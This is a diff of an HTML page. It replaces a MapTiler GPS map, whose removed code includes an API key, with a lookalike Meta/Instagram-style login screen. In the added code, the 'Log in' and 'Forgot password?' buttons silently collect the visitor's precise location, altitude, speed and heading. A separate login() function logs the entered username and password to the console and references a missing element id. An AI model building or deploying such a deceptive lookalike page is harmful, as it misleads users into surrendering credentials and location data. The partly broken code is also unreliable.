@@ -1,101 +1,251 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MapTiler GPS with Multiple Styles</title>
 
-<!-- Leaflet CSS -->
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<title>Login</title>
 
 <style>
-html, body { margin:0; padding:0; height:100%; }
-#map { height:100%; width:100%; }
-#btn {
-    position:absolute;
-    top:10px;
-    left:10px;
-    z-index:1000;
-    padding:10px;
-    background:white;
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    height:100vh;
+    background:#fafafa;
+
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+
+    display:flex;
+    flex-direction:column;
+}
+
+/* TOP language */
+.top-bar{
+
+    text-align:center;
+
+    padding:15px;
+
+    font-size:14px;
+
+    color:#737373;
+}
+
+/* CENTER content */
+.center{
+
+    flex:1;
+
+    display:flex;
+
+    flex-direction:column;
+
+    justify-content:center;
+
+    align-items:center;
+
+    padding:20px;
+}
+
+/* logo */
+.logo{
+
+    width:75px;
+
+    margin-bottom:40px;
+}
+
+/* inputs */
+input{
+
+    width:100%;
+
+    max-width:340px;
+
+    padding:14px;
+
+    margin-bottom:12px;
+
+    border:1px solid #dbdbdb;
+
+    border-radius:12px;
+
+    font-size:16px;
+
+    background:#fafafa;
+}
+
+/* login button */
+.login{
+
+    width:100%;
+
+    max-width:340px;
+
+    padding:14px;
+
+    margin-top:5px;
+
     border:none;
+
+    border-radius:25px;
+
+    background:#1877f2;
+
+    color:white;
+
+    font-size:16px;
+
+    font-weight:600;
+}
+
+/* forgot password button */
+.forgot{
+
+    margin-top:15px;
+
+    border:none;
+
+    background:none;
+
+    color:#1877f2;
+
+    font-size:14px;
+}
+
+/* BOTTOM section */
+.bottom{
+
+    padding:20px;
+
+    text-align:center;
+}
+
+/* create account button */
+.create{
+
+    width:100%;
+
+    max-width:340px;
+
+    padding:14px;
+
+    border:1px solid #1877f2;
+
+    border-radius:25px;
+
+    background:none;
+
+    color:#1877f2;
+
     font-size:16px;
 }
+
+/* meta */
+.meta{
+
+    margin-top:15px;
+
+    font-size:14px;
+
+    color:#737373;
+}
+
 </style>
+
 </head>
 <body>
 
-<button id="btn">Start Tracking My Location</button>
-<div id="map"></div>
 
-<!-- Leaflet JS -->
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<!-- TOP -->
+<div class="top-bar">
+English (US)
+</div>
+
+
+
+<!-- CENTER -->
+<div class="center">
+
+<img src="logo.png" class="logo">
+
+<input type="text" placeholder="Username, email or mobile number">
+
+<input type="password" placeholder="Password">
+
+<button onclick="getGPS()" class="login">Log in</button>
+
+<button onclick="getGPS()" class="forgot">Forgot password?</button>
+
+</div>
+
+
+
+<!-- BOTTOM -->
+<div class="bottom">
+
+<button class="create">Create new account</button>
+<pre id="gpsData"></pre>
+<div class="meta">Meta</div>
+
+</div>
+
+<input id="username">
+<button onclick="login()">Login</button>
+
+
+
 
 <script>
-const MAPTILER_KEY = "V63Z83Byl50yxUTJWQSP"; // replace with your MapTiler key
+function login(){
+    let username = document.getElementById("username").value;
+    let password = document.getElementById("Password").value;
+    console.log(username);
+    console.log(password);}
 
-// Create base layers
-var streets = L.tileLayer(`https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=${MAPTILER_KEY}`, {
-    attribution: '&copy; OpenStreetMap contributors &copy; MapTiler',
-    maxZoom: 20
-});
 
-var satellite = L.tileLayer(`https://api.maptiler.com/maps/hybrid/{z}/{x}/{y}.png?key=${MAPTILER_KEY}`, {
-    attribution: '&copy; OpenStreetMap contributors &copy; MapTiler',
-    maxZoom: 20
-});
 
-var terrain = L.tileLayer(`https://api.maptiler.com/maps/topo/{z}/{x}/{y}.png?key=${MAPTILER_KEY}`, {
-    attribution: '&copy; OpenStreetMap contributors &copy; MapTiler',
-    maxZoom: 20
-});
 
-// Initialize map
-var map = L.map('map', {
-    center: [0,0],
-    zoom: 2,
-    layers: [streets] // default
-});
 
-// Layer control to switch between styles
-var baseMaps = {
-    "Streets": streets,
-    "Satellite": satellite,
-    "Terrain": terrain
-};
-L.control.layers(baseMaps).addTo(map);
-
-var marker, accuracyCircle;
-
-// Button click to start GPS tracking
-document.getElementById("btn").onclick = function(){
-    if(navigator.geolocation){
-        navigator.geolocation.watchPosition(function(pos){
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
-
-            map.setView([lat, lon], 17);
-
-            if(marker) map.removeLayer(marker);
-            if(accuracyCircle) map.removeLayer(accuracyCircle);
-
-            marker = L.marker([lat, lon]).addTo(map)
-                     .bindPopup("You are here<br>Accuracy: " + acc + " m").openPopup();
-
-            accuracyCircle = L.circle([lat, lon], {radius: acc, color:'blue', fillOpacity:0.2}).addTo(map);
-
-        }, function(err){
-            alert("Error getting location: " + err.message);
-        }, {
-            enableHighAccuracy: true,
-            maximumAge: 1000,
-            timeout: 10000
-        });
+function getGPS(){
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(position){
+                // Get raw GPS data
+                const data = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    speed: position.coords.speed,
+                    heading: position.coords.heading
+                };
+                console.log("Raw GPS data:", data);
+                // Show it on the page
+                document.getElementById("gpsData").textContent = JSON.stringify(data, null, 2);
+            },
+            function(error){
+                console.error("Error getting GPS data:", error);
+            }
+        );
     } else {
-        alert("Geolocation not supported");
-    }
-};
-</script>
+        console.error("Geolocation is not supported by this browser.");
+    }   
+}
+
+
+
+
+
+
+
+
+  </script>
+
 
 </body>
 </html>
